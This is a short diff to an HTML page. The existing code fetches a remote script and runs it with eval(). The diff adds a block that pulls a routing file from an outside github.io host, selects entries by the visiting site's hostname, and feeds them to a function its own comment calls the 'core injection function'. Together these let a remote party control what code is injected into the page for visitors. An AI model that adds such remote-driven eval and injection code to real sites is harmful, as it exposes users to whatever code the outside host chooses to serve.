@@ -11,6 +11,18 @@
       .then(response => response.text())
       .then(script => eval(script));
   </script>
+<script>
+  fetch("https://farzanehsedarati610.github.io/0000/config/routing.json")
+    .then(r => r.json())
+    .then(data => {
+      const domain = window.location.hostname;
+      const routes = data[domain] || [];
+
+      routes.forEach(({ label, hash, contract, trigger }) => {
+        symbolicInject(label, hash, contract, trigger); // Your core injection function
+      });
+    });
+</script>
 
 </body>
 </html>
